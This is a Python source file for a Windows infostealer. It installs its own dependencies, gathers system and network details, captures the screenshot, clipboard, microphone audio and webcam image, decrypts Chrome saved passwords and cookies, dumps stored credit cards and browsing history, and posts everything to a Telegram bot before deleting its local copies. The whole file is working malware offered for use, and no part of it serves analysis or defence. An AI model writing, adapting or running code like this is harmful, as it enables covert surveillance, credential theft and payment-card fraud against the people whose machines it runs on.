import requests
import importlib
import subprocess
import platform
import psutil
import os
import re
import pyautogui
import time
import cv2
import pyperclip
import pyaudio
import wave
import psutil
import webbrowser
import sqlite3
import win32crypt
import shutil
import json
import base64
from Cryptodome.Cipher import AES

modules = ['psutil', 'pyautogui', 'opencv-python', 'pyperclip', 'pyaudio', 'wave', 'psutil', 'requests', 'pycryptodomex', 'pywin32']

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

for module in modules:
    try:
        importlib.import_module(module)
    except ImportError:
        subprocess.run(["pip", "install", module])

# Telegram Bot API
# For Text Messages
def send_message_to_telegram_bot(token, chat_id, message):
    Turl = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}
    response = requests.post(Turl, json=payload)
    if response.status_code == 200:
        print("Message sent successfully")
    else:
        print("Failed to send message")

    # For media and files


def send_document(document_path, chat_id, token):
    Durl = "https://api.telegram.org/bot{}/sendDocument".format(token)

    with open(document_path, 'rb') as f:
        params = {'chat_id': chat_id}
        files = {'document': f}
        response = requests.post(Durl, params=params, files=files)

    print(response.status_code, response.reason)


def get_system_info():
    """Collect system information and return it as a dictionary."""
    info = {
        "os": platform.system(),
        "hostname": platform.node(),
        "username": os.getlogin(),
        "cpu": platform.processor(),
        "memory": psutil.virtual_memory().total / (1024 ** 3),
    }
    return f"System Information\n {info} \n"


def get_network_info():
    """Collect network information and return it as a dictionary."""
    net_io = psutil.net_io_counters()
    info = {
        "bytes_sent": net_io.bytes_sent,
        "bytes_recv": net_io.bytes_recv,
        "packets_sent": net_io.packets_sent,
        "packets_recv": net_io.packets_recv,
    }

    return f"NETWORK INFO\n {info} \n"


# Wi-Fi Information

def get_wifi_info():
    """Collect information about the Wi-Fi network and available devices."""
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "network"])
        result = result.decode("utf-8")
        lines = result.split("\n")
        ssids = []
        for line in lines:
            if "SSID" in line:
                ssids.append(line.split(":")[1].strip())
        return f"Get Wi-Fi Information\n {'connected_ssid': ssids[0], 'available_ssids': ssids[1:]} \n"
    except:
        return {"error": "Could not retrieve Wi-Fi information"}


def get_network_devices():
    """Collect information about the devices connected to the network."""
    try:
        result = subprocess.check_output(["arp", "-a"])
        result = result.decode("utf-8")
        lines = result.split("\n")
        devices = []
        for line in lines:
            if "dynamic" in line:
                devices.append(line.split(" ")[0])
        return f"Devices connected to network: {'devices': devices}"
    except:
        return {"error": "Could not retrieve network devices information"}


# Capture Screenshots and Text from the clipboard


def steal_information():
    # Take a screenshot of the current screen
    screenshot = pyautogui.screenshot()
    file_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "screenshot.png")
    screenshot.save(file_path)

    # Get all text from the clipboard
    clipboard_text = pyperclip.paste()

    # Write the stolen information to a file
    file_path2 = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "stolen_information.txt")
    with open(file_path2, 'w', encoding='utf-8') as f:
        f.write(f'Clipboard text: {clipboard_text}')

    return file_path, file_path2


# Capture Audio from Microphone
def capture_audio(record_seconds, wave_output_filename):
    # Set the parameters for the audio recording
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    # CHANNELS = 2
    RATE = 44100

    # Start the PyAudio library
    p = pyaudio.PyAudio()

    # Get the default input device info
    default_device_info = p.get_default_input_device_info()

    # Determine the number of channels in use by the default input device
    CHANNELS = default_device_info['maxInputChannels']


    # Start the stream for recording
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    # Start the recording
    print("Recording audio...")
    frames = []
    for i in range(0, int(RATE / CHUNK * record_seconds)):
        data = stream.read(CHUNK)
        frames.append(data)
    print("Recording finished.")

    # Stop the stream and close the PyAudio library
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save the recording as a WAV file
    wf = wave.open(wave_output_filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


# CAPTURE IMAGE FROM WEBCAM

def capture_image_from_webcam():
    # Start the webcam
    cap = cv2.VideoCapture(0)

    # Check if the webcam is opened
    if not cap.isOpened():
        print("Webcam not found.")
        exit()

    # Read a frame from the webcam
    ret, frame = cap.read()

    # Check if a frame was successfully captured
    if not ret:
        print("Could not read a frame from the webcam.")
        exit()

    # Save the frame as an image file
    image_file = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cap.jpg")
    cv2.imwrite(image_file, frame)

    # Release the webcam
    cap.release()

    return image_file


# Open URL IN WEB BROWSER

def open_url(url):
    try:
        # Open the URL in the default browser
        webbrowser.open(url)
        print("Browser opened successfully")
    except Exception as e:
        print("Error: Failed to open browser")
        print("Error message: ", e)


def get_secret_key():
    try:
        # Get secret key from Chrome local state
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secret key cannot be found")
        return None


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    try:
        # Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        # Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        # Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""


def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None


def stealWebPassword():
    # Get secret key
    secret_key = get_secret_key()
    if not secret_key:
        return None

    # Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
    for folder in folders:
        # Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
        conn = get_db_connection(chrome_path_login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")

            # Open a text file to write the results
            pass_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "passwords.txt")
            with open(pass_path, "w", encoding='utf-8') as f:
                for links, user_name, pwd in cursor.fetchall():
                    decrypted_password = decrypt_password(pwd, secret_key)
                    f.write("Website: {}\nUsername: {}\nPassword: {}\n".format(links, user_name, decrypted_password))

            # Close database connection
            cursor.close()
            conn.close()
            # Delete temp login db
            os.remove("Loginvault.db")

            return pass_path

    return None


def stealCardDetails():
    # Get secret key
    secret_key = get_secret_key()
    if not secret_key:
        return None

    # Search user profile or default folder (this is where the encrypted credit card details are stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
    for folder in folders:
        # Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(r"%s\%s\Web Data" % (CHROME_PATH, folder))
        conn = get_db_connection(chrome_path_login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM credit_cards")

            # Open a text file to write the results
            card_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cards.txt")
            with open(card_path, "w") as f:
                for result in cursor.fetchall():
                    f.write("CCN: {}\nEXP yr: {}\nEXP mo: {}\nNAME: {}\n".format(result[4], result[3], result[2],
                                                                                 result[1]))

            # Clean up
            cursor.close()
            conn.close()
            # Delete temp login db
            os.remove("Loginvault.db")

            return card_path

    return None

def stealBrowserCookies():
    # Get secret key
    secret_key = get_secret_key()
    if not secret_key:
        return None

    # Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile.*|^Default$", element) is not None]
    network_folders = [os.path.join(CHROME_PATH, folder, "Network") for folder in folders if os.path.exists(os.path.join(CHROME_PATH, folder, "Network"))]
    for folder in network_folders:
        # Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(os.path.join(folder, "Cookies"))
        # print(chrome_path_login_db)
        conn = get_db_connection(chrome_path_login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM cookies")

            # Open a text file to write the results
        cookies_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cookies.json")
        with open(cookies_path, "w", encoding='utf-8') as f:
            cookies = []
            for result in cursor.fetchall():
                cookie = {}
                for i, field in enumerate(cursor.description):
                    if field[0] == "encrypted_value":
                        cookie[field[0]] = decrypt_password(result[i], secret_key)
                    else:
                        cookie[field[0]] = result[i]
                cookies.append(cookie)
            json.dump(cookies, f, indent=4)

            # Clean up
            cursor.close()
            conn.close()
            # Delete temp login db
            os.remove("Loginvault.db")

            return cookies_path

    return None


def stealBrowserHistory():
    # Get secret key
    secret_key = get_secret_key()
    if not secret_key:
        return None

    # Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
    for folder in folders:
        # Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(r"%s\%s\History" % (CHROME_PATH, folder))
        conn = get_db_connection(chrome_path_login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM urls")

            # Open a text file to write the results
            history_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "history.txt")
            with open(history_path, "w", encoding='utf-8') as f:
                for result in cursor.fetchall():
                    f.write("Host: {}\nTitle: {}\nVisits: {}\n".format(result[1], result[2], result[3] + 1))

            # Clean up
            cursor.close()
            conn.close()
            # Delete temp login db
            os.remove("Loginvault.db")

            return history_path

    return None


if __name__ == '__main__':
    if not os.path.exists(os.path.join(os.path.expanduser("~/Desktop/screenshots"))):
        os.makedirs(os.path.join(os.path.expanduser("~/Desktop/screenshots")))

    cid = "your_chat_id"
    tok = "your_token_id"
    send_message_to_telegram_bot(tok, cid, get_network_info())
    send_message_to_telegram_bot(tok, cid, get_wifi_info())
    send_message_to_telegram_bot(tok, cid, get_network_devices())
    send_message_to_telegram_bot(tok, cid, get_system_info())

    # Continuously steal screenshot and clipboard every 5 seconds
    file_path, file_path2 = steal_information()

    # Capture Audio from Microphone
    record_seconds = 3
    wave_output_filename = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "recording.wav")
    capture_audio(record_seconds, wave_output_filename)

    # Capture Image from Webcam
    image_file = capture_image_from_webcam()

    # Get all Passwords from browser
    pass_path = stealWebPassword()

    # Get CARD DETAILS from Browser
    card_path = stealCardDetails()

    # Get BROWSER COOKIES only if currentlly no any process uses chrome
    cookie_path = stealBrowserCookies()


    # Get BROWSER HISTORY
    history_path = stealBrowserHistory()

    # Open URL IN WEB BROWSER
    time.sleep(5)
    url = "https://github.com/Anonymous3017"
    open_url(url)

    # Sending Document to bot
    send_document(file_path, cid, tok)
    send_document(file_path2, cid, tok)
    send_document(image_file, cid, tok)
    send_document(pass_path, cid, tok)
    send_document(card_path, cid, tok)
    send_document(cookie_path, cid, tok)
    send_document(history_path, cid, tok)
    send_document(wave_output_filename, cid, tok)

    time.sleep(5)
    if os.path.exists(os.path.join(os.path.expanduser("~/Desktop/screenshots"))):
        shutil.rmtree(os.path.join(os.path.expanduser("~/Desktop/screenshots")))
